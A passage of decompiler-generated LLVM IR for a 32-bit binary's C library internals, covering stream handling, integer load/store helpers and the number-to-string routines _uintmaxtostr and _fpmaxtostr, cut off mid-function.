  %v0_8061984 = load i32, i32* @ebx, align 4
  %v4_8061988 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8061988, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_8061990 = bitcast i16* %arg1 to i32*
  %v2_8061990 = load i32, i32* %v1_8061990, align 4
  store i32 %v2_8061990, i32* %eax.global-to-local, align 4
  %v1_8061992 = urem i32 %v2_8061990, 65536
  store i32 %v1_8061992, i32* %edx.global-to-local, align 4
  %v2_8061995 = and i32 %v1_8061992, %arg2
  %v3_8061995 = icmp eq i32 %v2_8061995, 0
  %v1_8061997 = icmp eq i1 %v3_8061995, false
  br i1 %v1_8061997, label %dec_label_pc_80619a6, label %dec_label_pc_8061999

dec_label_pc_8061999:                             ; preds = %entry
  %v1_8061999 = and i32 %v2_8061990, 2176
  %v2_8061999 = icmp eq i32 %v1_8061999, 0
  store i32 %v1_8061999, i32* %edx.global-to-local, align 4
  %v1_806199f = icmp eq i1 %v2_8061999, false
  br i1 %v1_806199f, label %dec_label_pc_80619ae, label %dec_label_pc_80619a1

dec_label_pc_80619a1:                             ; preds = %dec_label_pc_8061999
  %v2_80619a1 = or i32 %v2_8061990, %arg2
  store i32 %v2_80619a1, i32* %eax.global-to-local, align 4
  %v1_80619a3 = trunc i32 %v2_80619a1 to i16
  store i16 %v1_80619a3, i16* %arg1, align 2
  %v0_80619a6.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80619a6

dec_label_pc_80619a6:                             ; preds = %entry, %dec_label_pc_80619a1
  %v0_80619eb = phi i32 [ %v4_8061988, %entry ], [ %v0_80619a6.pre, %dec_label_pc_80619a1 ]
  %v1_80619a6 = inttoptr i32 %v0_80619eb to i16*
  %v2_80619a6 = load i16, i16* %v1_80619a6, align 2
  %v3_80619a6 = zext i16 %v2_80619a6 to i32
  store i32 %v3_80619a6, i32* %edx.global-to-local, align 4
  %v2_80619a9 = and i16 %v2_80619a6, 32
  %v3_80619a9 = icmp eq i16 %v2_80619a9, 0
  br i1 %v3_80619a9, label %dec_label_pc_80619c2, label %dec_label_pc_80619ae

dec_label_pc_80619ae:                             ; preds = %dec_label_pc_80619a6, %dec_label_pc_8061999
  %v1_80619ae = call i32 @__errno_location(i32 %v0_8061984)
  store i32 %v1_80619ae, i32* %eax.global-to-local, align 4
  %v1_80619b3 = inttoptr i32 %v1_80619ae to i32*
  store i32 9, i32* %v1_80619b3, align 4
  br label %dec_label_pc_80619b9

dec_label_pc_80619b9:                             ; preds = %dec_label_pc_80619d9, %dec_label_pc_80619ae
  %v0_80619b9 = load i32, i32* @ebx, align 4
  %v1_80619b9 = inttoptr i32 %v0_80619b9 to i16*
  %v2_80619b9 = load i16, i16* %v1_80619b9, align 2
  %v3_80619b9 = or i16 %v2_80619b9, 8
  store i16 %v3_80619b9, i16* %v1_80619b9, align 2
  store i32 -1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8061a1c

dec_label_pc_80619c2:                             ; preds = %dec_label_pc_80619a6
  %v2_80619c2 = urem i16 %v2_80619a6, 4
  %v3_80619c2 = icmp eq i16 %v2_80619c2, 0
  br i1 %v3_80619c2, label %dec_label_pc_8061a08, label %dec_label_pc_80619c7

dec_label_pc_80619c7:                             ; preds = %dec_label_pc_80619c2
  %v2_80619c7 = and i32 %v3_80619a6, 4
  %v3_80619c7 = icmp eq i32 %v2_80619c7, 0
  %v1_80619ca = icmp eq i1 %v3_80619c7, false
  br i1 %v1_80619ca, label %dec_label_pc_80619f8, label %dec_label_pc_80619cc

dec_label_pc_80619cc:                             ; preds = %dec_label_pc_80619c7
  %v1_80619cc = add i32 %v0_80619eb, 20
  %v2_80619cc = inttoptr i32 %v1_80619cc to i32*
  %v3_80619cc = load i32, i32* %v2_80619cc, align 4
  store i32 %v3_80619cc, i32* %eax.global-to-local, align 4
  %v2_80619cf = add i32 %v0_80619eb, 16
  %v3_80619cf = inttoptr i32 %v2_80619cf to i32*
  %v4_80619cf = load i32, i32* %v3_80619cf, align 4
  %v15_80619cf = icmp eq i32 %v3_80619cc, %v4_80619cf
  %v1_80619d2 = icmp eq i1 %v15_80619cf, false
  br i1 %v1_80619d2, label %dec_label_pc_80619d9, label %dec_label_pc_80619d4

dec_label_pc_80619d4:                             ; preds = %dec_label_pc_80619cc
  %v2_80619d4 = and i32 %v3_80619a6, 2
  %v3_80619d4 = icmp eq i32 %v2_80619d4, 0
  br i1 %v3_80619d4, label %dec_label_pc_80619f8, label %dec_label_pc_80619d9

dec_label_pc_80619d9:                             ; preds = %dec_label_pc_80619d4, %dec_label_pc_80619cc
  %v1_80619d9 = and i32 %v3_80619a6, 1024
  store i32 %v1_80619d9, i32* %edx.global-to-local, align 4
  %tmp16 = udiv i32 %v1_80619d9, 1024
  %tmp17 = xor i32 %tmp16, 3
  store i32 %tmp17, i32* %eax.global-to-local, align 4
  %v5_80619ec = call i32 @__GI_fseek(i32 %v0_80619eb, i32 0, i32 %tmp17, i32 %v1_80619d9)
  store i32 %v5_80619ec, i32* %eax.global-to-local, align 4
  %v1_80619f4 = icmp eq i32 %v5_80619ec, 0
  %v1_80619f6 = icmp eq i1 %v1_80619f4, false
  br i1 %v1_80619f6, label %dec_label_pc_80619b9, label %dec_label_pc_80619d9.dec_label_pc_80619f8_crit_edge

dec_label_pc_80619d9.dec_label_pc_80619f8_crit_edge: ; preds = %dec_label_pc_80619d9
  %v0_80619f8.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80619f8

dec_label_pc_80619f8:                             ; preds = %dec_label_pc_80619d9.dec_label_pc_80619f8_crit_edge, %dec_label_pc_80619d4, %dec_label_pc_80619c7
  %v10_80619f8 = phi i32 [ %v0_80619f8.pre, %dec_label_pc_80619d9.dec_label_pc_80619f8_crit_edge ], [ %v0_80619eb, %dec_label_pc_80619d4 ], [ %v0_80619eb, %dec_label_pc_80619c7 ]
  %v1_80619f8 = inttoptr i32 %v10_80619f8 to i16*
  %v2_80619f8 = load i16, i16* %v1_80619f8, align 2
  %v3_80619f8 = and i16 %v2_80619f8, -4
  store i16 %v3_80619f8, i16* %v1_80619f8, align 2
  %v0_80619fc = load i32, i32* @ebx, align 4
  %v1_80619fc = add i32 %v0_80619fc, 8
  %v2_80619fc = inttoptr i32 %v1_80619fc to i32*
  %v3_80619fc = load i32, i32* %v2_80619fc, align 4
  store i32 %v3_80619fc, i32* %eax.global-to-local, align 4
  %v2_80619ff = add i32 %v0_80619fc, 24
  %v3_80619ff = inttoptr i32 %v2_80619ff to i32*
  store i32 %v3_80619fc, i32* %v3_80619ff, align 4
  %v0_8061a02 = load i32, i32* %eax.global-to-local, align 4
  %v1_8061a02 = load i32, i32* @ebx, align 4
  %v2_8061a02 = add i32 %v1_8061a02, 16
  %v3_8061a02 = inttoptr i32 %v2_8061a02 to i32*
  store i32 %v0_8061a02, i32* %v3_8061a02, align 4
  %v0_8061a05 = load i32, i32* %eax.global-to-local, align 4
  %v1_8061a05 = load i32, i32* @ebx, align 4
  %v2_8061a05 = add i32 %v1_8061a05, 20
  %v3_8061a05 = inttoptr i32 %v2_8061a05 to i32*
  store i32 %v0_8061a05, i32* %v3_8061a05, align 4
  %v0_8061a08.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8061a08

dec_label_pc_8061a08:                             ; preds = %dec_label_pc_80619c2, %dec_label_pc_80619f8
  %v9_8061a08 = phi i32 [ %v0_80619eb, %dec_label_pc_80619c2 ], [ %v0_8061a08.pre, %dec_label_pc_80619f8 ]
  %v1_8061a08 = inttoptr i32 %v9_8061a08 to i16*
  %v2_8061a08 = load i16, i16* %v1_8061a08, align 2
  %v3_8061a08 = or i16 %v2_8061a08, 64
  store i16 %v3_8061a08, i16* %v1_8061a08, align 2
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8061a0e = load i32, i32* @ebx, align 4
  %v1_8061a0e = inttoptr i32 %v0_8061a0e to i16*
  %v2_8061a0e = load i16, i16* %v1_8061a0e, align 2
  %v3_8061a0e = zext i16 %v2_8061a0e to i32
  store i32 %v3_8061a0e, i32* %eax.global-to-local, align 4
  %v3_8061a11 = and i16 %v2_8061a0e, 2816
  %v4_8061a11 = icmp eq i16 %v3_8061a11, 0
  %v1_8061a14 = icmp eq i1 %v4_8061a11, false
  br i1 %v1_8061a14, label %dec_label_pc_8061a1c, label %dec_label_pc_8061a16

dec_label_pc_8061a16:                             ; preds = %dec_label_pc_8061a08
  %v1_8061a16 = add i32 %v0_8061a0e, 12
  %v2_8061a16 = inttoptr i32 %v1_8061a16 to i32*
  %v3_8061a16 = load i32, i32* %v2_8061a16, align 4
  store i32 %v3_8061a16, i32* %eax.global-to-local, align 4
  %v2_8061a19 = add i32 %v0_8061a0e, 28
  %v3_8061a19 = inttoptr i32 %v2_8061a19 to i32*
  store i32 %v3_8061a16, i32* %v3_8061a19, align 4
  %v0_8061a1c.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8061a1c

dec_label_pc_8061a1c:                             ; preds = %dec_label_pc_8061a08, %dec_label_pc_80619b9, %dec_label_pc_8061a16
  %v0_8061a1c = phi i32 [ 0, %dec_label_pc_8061a08 ], [ -1, %dec_label_pc_80619b9 ], [ %v0_8061a1c.pre, %dec_label_pc_8061a16 ]
  store i32 %v0_8061a1c, i32* %eax.global-to-local, align 4
  %v2_8061a1e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8061a1e, i32* @edx, align 4
  store i32 %v0_8061984, i32* @ebx, align 4
  ret i32 %v0_8061a1c

; uselistorder directives
  uselistorder i32 %v0_8061a1c, { 1, 0 }
  uselistorder i32 %v0_8061a0e, { 1, 0, 2 }
  uselistorder i32 %tmp17, { 1, 0 }
  uselistorder i32 %v1_80619d9, { 1, 0, 2 }
  uselistorder i32 %v0_80619eb, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_8061992, { 1, 0 }
  uselistorder i32 %v2_8061990, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8061984, { 1, 0 }
  uselistorder i16 64, { 1, 0 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8061a1c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8061a08, { 1, 0 }
  uselistorder label %dec_label_pc_80619a6, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_8061a2c = icmp slt i32 %tmp, 0
  %v3_8061a55 = and i32 %tmp5, 2048
  %v4_8061a55 = icmp eq i32 %v3_8061a55, 0
  br i1 %v5_8061a2c, label %dec_label_pc_8061a55, label %dec_label_pc_8061a33

dec_label_pc_8061a33:                             ; preds = %entry
  %v1_8061a36 = icmp eq i1 %v4_8061a55, false
  br i1 %v1_8061a36, label %dec_label_pc_8061a5a, label %dec_label_pc_8061a38

dec_label_pc_8061a38:                             ; preds = %dec_label_pc_8061a33
  %v1_8061a38 = inttoptr i32 %tmp4 to i32*
  %v2_8061a38 = load i32, i32* %v1_8061a38, align 4
  %v6_8061a3a = icmp eq i32 %tmp5, 256
  %v1_8061a40 = icmp eq i1 %v6_8061a3a, false
  br i1 %v1_8061a40, label %dec_label_pc_8061a47, label %dec_label_pc_8061a42

dec_label_pc_8061a42:                             ; preds = %dec_label_pc_8061a38
  %v1_8061a42 = urem i32 %v2_8061a38, 256
  br label %dec_label_pc_8061a52

dec_label_pc_8061a47:                             ; preds = %dec_label_pc_8061a38
  %v6_8061a47 = icmp eq i32 %tmp5, 512
  %v1_8061a4d = icmp eq i1 %v6_8061a47, false
  br i1 %v1_8061a4d, label %dec_label_pc_8061a52, label %dec_label_pc_8061a4f

dec_label_pc_8061a4f:                             ; preds = %dec_label_pc_8061a47
  %v1_8061a4f = urem i32 %v2_8061a38, 65536
  br label %dec_label_pc_8061a52

dec_label_pc_8061a52:                             ; preds = %dec_label_pc_8061a47, %dec_label_pc_8061a42, %dec_label_pc_8061a4f
  %v0_8061a54 = phi i32 [ %v2_8061a38, %dec_label_pc_8061a47 ], [ %v1_8061a42, %dec_label_pc_8061a42 ], [ %v1_8061a4f, %dec_label_pc_8061a4f ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_8061a54

dec_label_pc_8061a55:                             ; preds = %entry
  br i1 %v4_8061a55, label %dec_label_pc_8061a60, label %dec_label_pc_8061a5a

dec_label_pc_8061a5a:                             ; preds = %dec_label_pc_8061a55, %dec_label_pc_8061a33
  %v1_8061a5a = add i32 %tmp4, 4
  %v2_8061a5a = inttoptr i32 %v1_8061a5a to i32*
  %v3_8061a5a = load i32, i32* %v2_8061a5a, align 4
  store i32 %v3_8061a5a, i32* @edx, align 4
  %v1_8061a5d = inttoptr i32 %tmp4 to i32*
  %v2_8061a5d = load i32, i32* %v1_8061a5d, align 4
  ret i32 %v2_8061a5d

dec_label_pc_8061a60:                             ; preds = %dec_label_pc_8061a55
  %v1_8061a60 = inttoptr i32 %tmp4 to i32*
  %v2_8061a60 = load i32, i32* %v1_8061a60, align 4
  %v6_8061a62 = icmp eq i32 %tmp5, 256
  %v1_8061a68 = icmp eq i1 %v6_8061a62, false
  br i1 %v1_8061a68, label %dec_label_pc_8061a6f, label %dec_label_pc_8061a6a

dec_label_pc_8061a6a:                             ; preds = %dec_label_pc_8061a60
  %v1_8061a6a = mul i32 %v2_8061a60, 16777216
  %v2_8061a6a = sdiv i32 %v1_8061a6a, 16777216
  br label %dec_label_pc_8061a78

dec_label_pc_8061a6f:                             ; preds = %dec_label_pc_8061a60
  %v6_8061a6f = icmp eq i32 %tmp5, 512
  %v1_8061a75 = icmp eq i1 %v6_8061a6f, false
  br i1 %v1_8061a75, label %dec_label_pc_8061a78, label %dec_label_pc_8061a77

dec_label_pc_8061a77:                             ; preds = %dec_label_pc_8061a6f
  %v1_8061a77 = mul i32 %v2_8061a60, 65536
  %v2_8061a77 = sdiv i32 %v1_8061a77, 65536
  br label %dec_label_pc_8061a78

dec_label_pc_8061a78:                             ; preds = %dec_label_pc_8061a6f, %dec_label_pc_8061a6a, %dec_label_pc_8061a77
  %v0_8061a78 = phi i32 [ %v2_8061a60, %dec_label_pc_8061a6f ], [ %v2_8061a6a, %dec_label_pc_8061a6a ], [ %v2_8061a77, %dec_label_pc_8061a77 ]
  %v1_8061a78 = ashr i32 %v0_8061a78, 31
  store i32 %v1_8061a78, i32* @edx, align 4
  ret i32 %v0_8061a78

; uselistorder directives
  uselistorder i32 %v0_8061a78, { 1, 0 }
  uselistorder i32 %v2_8061a60, { 2, 0, 1 }
  uselistorder i32 %v2_8061a38, { 2, 0, 1 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8061a78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8061a52, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_1()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8061a7c = load i32, i32* @ebx, align 4
  store i32 %v0_8061a7c, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_8061a81 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_8061a81, i32* %ebx.global-to-local, align 4
  %v4_8061a85 = trunc i32 %tmp4 to i16
  %v6_8061a8d = icmp eq i32 %tmp6, 256
  %v1_8061a93 = icmp eq i1 %v6_8061a8d, false
  br i1 %v1_8061a93, label %dec_label_pc_8061a99, label %dec_label_pc_8061a95

dec_label_pc_8061a95:                             ; preds = %entry
  %v2_8061a95 = trunc i32 %tmp4 to i8
  %v4_8061a95 = bitcast i16* %tmp5 to i8*
  store i8 %v2_8061a95, i8* %v4_8061a95, align 1
  br label %dec_label_pc_8061ab7

dec_label_pc_8061a99:                             ; preds = %entry
  %v6_8061a99 = icmp eq i32 %tmp6, 2048
  %v1_8061a9f = icmp eq i1 %v6_8061a99, false
  br i1 %v1_8061a9f, label %dec_label_pc_8061aa8, label %dec_label_pc_8061aa1

dec_label_pc_8061aa1:                             ; preds = %dec_label_pc_8061a99
  %sext2 = mul i32 %tmp4, 65536
  %v1_8061aa1 = sdiv i32 %sext2, 65536
  %v3_8061aa1 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8061aa1, i32* %v3_8061aa1, align 4
  %v0_8061aa3 = load i32, i32* %edx.global-to-local, align 4
  %v1_8061aa3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8061aa3 = add i32 %v1_8061aa3, 4
  %v3_8061aa3 = inttoptr i32 %v2_8061aa3 to i32*
  store i32 %v0_8061aa3, i32* %v3_8061aa3, align 4
  br label %dec_label_pc_8061ab7

dec_label_pc_8061aa8:                             ; preds = %dec_label_pc_8061a99
  %v6_8061aa8 = icmp eq i32 %tmp6, 512
  %v1_8061aae = icmp eq i1 %v6_8061aa8, false
  br i1 %v1_8061aae, label %dec_label_pc_8061ab5, label %dec_label_pc_8061ab0

dec_label_pc_8061ab0:                             ; preds = %dec_label_pc_8061aa8
  store i16 %v4_8061a85, i16* %tmp5, align 2
  br label %dec_label_pc_8061ab7

dec_label_pc_8061ab5:                             ; preds = %dec_label_pc_8061aa8
  %sext3 = mul i32 %tmp4, 65536
  %v1_8061ab5 = sdiv i32 %sext3, 65536
  %v3_8061ab5 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8061ab5, i32* %v3_8061ab5, align 4
  br label %dec_label_pc_8061ab7

dec_label_pc_8061ab7:                             ; preds = %dec_label_pc_8061ab0, %dec_label_pc_8061aa1, %dec_label_pc_8061a95, %dec_label_pc_8061ab5
  %v2_8061ab7 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8061ab7, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_8061ab8 = sdiv i32 %sext, 65536
  ret i32 %v1_8061ab8

; uselistorder directives
  uselistorder label %dec_label_pc_8061ab7, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_8061ac7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8061ac7, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_8061ad3 = icmp slt i32 %arg4, 0
  %v1_8061ad5 = icmp eq i1 %v2_8061ad3, false
  br i1 %v1_8061ad5, label %dec_label_pc_8061af6, label %dec_label_pc_8061ad7

dec_label_pc_8061ad7:                             ; preds = %entry
  %v1_8061ad7 = sub i32 0, %arg4
  store i32 %v1_8061ad7, i32* %esi.global-to-local, align 4
  %v2_8061ad9 = icmp slt i32 %arg3, 0
  %v1_8061adb = icmp eq i1 %v2_8061ad9, false
  br i1 %v1_8061adb, label %dec_label_pc_8061af6, label %dec_label_pc_8061add

dec_label_pc_8061add:                             ; preds = %dec_label_pc_8061ad7
  %v1_8061add = sub i32 0, %arg2
  %v5_8061add = icmp ne i32 %arg2, 0
  store i32 %v1_8061add, i32* %ecx.global-to-local, align 4
  %v2_8061adf = zext i1 %v5_8061add to i32
  %v3_8061adf = add i32 %v2_8061adf, %arg3
  %v1_8061aea = sub i32 0, %v3_8061adf
  store i32 %v1_8061aea, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061af6

dec_label_pc_8061af6:                             ; preds = %entry, %dec_label_pc_8061ad7, %dec_label_pc_8061add
  %v0_8061afb = phi i32 [ %v1_8061ad7, %dec_label_pc_8061add ], [ %v1_8061ad7, %dec_label_pc_8061ad7 ], [ %arg4, %entry ]
  %stack_var_-28.0 = phi i32 [ 1, %dec_label_pc_8061add ], [ 0, %dec_label_pc_8061ad7 ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_8061afb
  %tmp35 = urem i32 -1, %v0_8061afb
  %v1_8061afd = add i32 %tmp35, 1
  store i8 0, i8* %arg1, align 1
  %v1_8061b01 = load i32, i32* %esi.global-to-local, align 4
  %v12_8061b01 = icmp eq i32 %v1_8061afd, %v1_8061b01
  %v1_8061b0b = icmp eq i1 %v12_8061b01, false
  br i1 %v1_8061b0b, label %dec_label_pc_8061b1a, label %dec_label_pc_8061b0d

dec_label_pc_8061b0d:                             ; preds = %dec_label_pc_8061af6
  %v1_8061b0d = add i32 %div, 1
  br label %dec_label_pc_8061b1a

dec_label_pc_8061b1a:                             ; preds = %dec_label_pc_8061af6, %dec_label_pc_8061b0d
  %stack_var_-20.0.off0 = phi i32 [ %v1_8061afd, %dec_label_pc_8061af6 ], [ 0, %dec_label_pc_8061b0d ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_8061af6 ], [ %v1_8061b0d, %dec_label_pc_8061b0d ]
  %v0_8061b1a = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8061b1a, i32* %ebp.global-to-local, align 4
  %v0_8061b1c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8061b1c, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8061b22

dec_label_pc_8061b22:                             ; preds = %dec_label_pc_8061b61, %dec_label_pc_8061b1a
  %v0_8061b59 = phi i32 [ %v0_8061b72, %dec_label_pc_8061b61 ], [ %v0_8061b1a, %dec_label_pc_8061b1a ]
  %v0_8061b26 = phi i32 [ %v1_8061b74, %dec_label_pc_8061b61 ], [ %v0_8061b1c, %dec_label_pc_8061b1a ]
  %v1_8061b22 = icmp eq i32 %v0_8061b26, 0
  br i1 %v1_8061b22, label %dec_label_pc_8061b59, label %dec_label_pc_8061b26

dec_label_pc_8061b26:                             ; preds = %dec_label_pc_8061b22
  %v0_8061b2a = load i32, i32* %esi.global-to-local, align 4
  %div7 = udiv i32 %v0_8061b26, %v0_8061b2a
  %tmp36 = urem i32 %v0_8061b26, %v0_8061b2a
  store i32 %div7, i32* %ebx.global-to-local, align 4
  %div8 = udiv i32 %v0_8061b59, %v0_8061b2a
  %tmp37 = urem i32 %v0_8061b59, %v0_8061b2a
  store i32 %div8, i32* %ebp.global-to-local, align 4
  %v6_8061b3d = mul i32 %tmp36, %stack_var_-20.0.off0
  %v2_8061b41 = add i32 %tmp37, %v6_8061b3d
  %v8_8061b47 = mul i32 %tmp36, %stack_var_-24.0.in
  %v2_8061b4c = add i32 %div8, %v8_8061b47
  store i32 %v2_8061b4c, i32* %ecx.global-to-local, align 4
  %div9 = udiv i32 %v2_8061b41, %v0_8061b2a
  %tmp38 = urem i32 %v2_8061b41, %v0_8061b2a
  %v2_8061b54 = add i32 %div9, %v2_8061b4c
  br label %dec_label_pc_8061b61

dec_label_pc_8061b59:                             ; preds = %dec_label_pc_8061b22
  %v0_8061b5d = load i32, i32* %esi.global-to-local, align 4
  %div12 = udiv i32 %v0_8061b59, %v0_8061b5d
  %tmp39 = urem i32 %v0_8061b59, %v0_8061b5d
  br label %dec_label_pc_8061b61

dec_label_pc_8061b61:                             ; preds = %dec_label_pc_8061b26, %dec_label_pc_8061b59
  %v0_8061b67 = phi i32 [ %tmp38, %dec_label_pc_8061b26 ], [ %tmp39, %dec_label_pc_8061b59 ]
  %storemerge = phi i32 [ %v2_8061b54, %dec_label_pc_8061b26 ], [ %div12, %dec_label_pc_8061b59 ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_8061b61 = load i32, i32* %edi.global-to-local, align 4
  %v1_8061b61 = add i32 %v0_8061b61, -1
  store i32 %v1_8061b61, i32* %edi.global-to-local, align 4
  %tmp40 = icmp ult i32 %v0_8061b67, 10
  %storemerge14.in.v = select i1 %tmp40, i32 48, i32 %arg5
  %storemerge14.in = add i32 %storemerge14.in.v, %v0_8061b67
  %v8_8061b67 = trunc i32 %storemerge14.in to i8
  %v3_8061b70 = inttoptr i32 %v1_8061b61 to i8*
  store i8 %v8_8061b67, i8* %v3_8061b70, align 1
  %v0_8061b72 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8061b74 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8061b74 = or i32 %v1_8061b74, %v0_8061b72
  %v3_8061b74 = icmp eq i32 %v2_8061b74, 0
  %v1_8061b76 = icmp eq i1 %v3_8061b74, false
  br i1 %v1_8061b76, label %dec_label_pc_8061b22, label %dec_label_pc_8061b78

dec_label_pc_8061b78:                             ; preds = %dec_label_pc_8061b61
  %v4_8061b78 = icmp eq i32 %stack_var_-28.0, 0
  br i1 %v4_8061b78, label %dec_label_pc_8061b83, label %dec_label_pc_8061b7f

dec_label_pc_8061b7f:                             ; preds = %dec_label_pc_8061b78
  %v0_8061b7f = load i32, i32* %edi.global-to-local, align 4
  %v1_8061b7f = add i32 %v0_8061b7f, -1
  store i32 %v1_8061b7f, i32* %edi.global-to-local, align 4
  %v1_8061b80 = inttoptr i32 %v1_8061b7f to i8*
  store i8 45, i8* %v1_8061b80, align 1
  br label %dec_label_pc_8061b83

dec_label_pc_8061b83:                             ; preds = %dec_label_pc_8061b78, %dec_label_pc_8061b7f
  %v0_8061b86 = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_8061b86

; uselistorder directives
  uselistorder i32 %v2_8061b41, { 1, 0 }
  uselistorder i32 %v0_8061b2a, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_8061b26, { 1, 0, 2 }
  uselistorder i32 %v0_8061b59, { 1, 0, 3, 2 }
  uselistorder i32 %v1_8061afd, { 1, 0 }
  uselistorder i32 %v0_8061afb, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i8 45, { 10, 1, 2, 3, 4, 0, 5, 6, 7, 8, 9 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8061b83, { 1, 0 }
  uselistorder label %dec_label_pc_8061b61, { 1, 0 }
  uselistorder label %dec_label_pc_8061b1a, { 1, 0 }
  uselistorder label %dec_label_pc_8061af6, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp103 = call i16 @__decompiler_undefined_function_2()
  %tmp112 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8061b91 = load i32, i32* @edi, align 4
  %v0_8061b92 = load i32, i32* @esi, align 4
  %v0_8061b93 = load i32, i32* @ebx, align 4
  store i32 %v0_8061b93, i32* %stack_var_-16, align 4
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v4_8061ba8 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_8061ba8 = add i3 %v4_8061ba8, -1
  store i3 %v5_8061ba8, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8061baf = add i32 %tmp112, 4
  %v2_8061baf = inttoptr i32 %v1_8061baf to i32*
  %v3_8061baf = load i32, i32* %v2_8061baf, align 4
  store i32 %v3_8061baf, i32* %eax.global-to-local, align 4
  %v1_8061bb6 = add i32 %tmp112, 8
  %v2_8061bb6 = inttoptr i32 %v1_8061bb6 to i8*
  %v3_8061bb6 = load i8, i8* %v2_8061bb6, align 1
  %v4_8061bb6 = zext i8 %v3_8061bb6 to i32
  %v5_8061bb6 = load i32, i32* @ecx, align 4
  %v6_8061bb6 = and i32 %v5_8061bb6, -256
  %v7_8061bb6 = or i32 %v6_8061bb6, %v4_8061bb6
  store i32 %v7_8061bb6, i32* %ecx.global-to-local, align 4
  %v1_8061bb9 = inttoptr i32 %tmp112 to i32*
  %v2_8061bb9 = load i32, i32* %v1_8061bb9, align 4
  store i32 %v2_8061bb9, i32* %ebp.global-to-local, align 4
  %v3_8061bbb = and i32 %v3_8061baf, -256
  %v4_8061bbb = or i32 %v3_8061bbb, %v4_8061bb6
  %v1_8061bc1 = or i32 %v4_8061bbb, 32
  %v3_8061bc1 = trunc i32 %v1_8061bc1 to i8
  store i32 %v1_8061bc1, i32* %eax.global-to-local, align 4
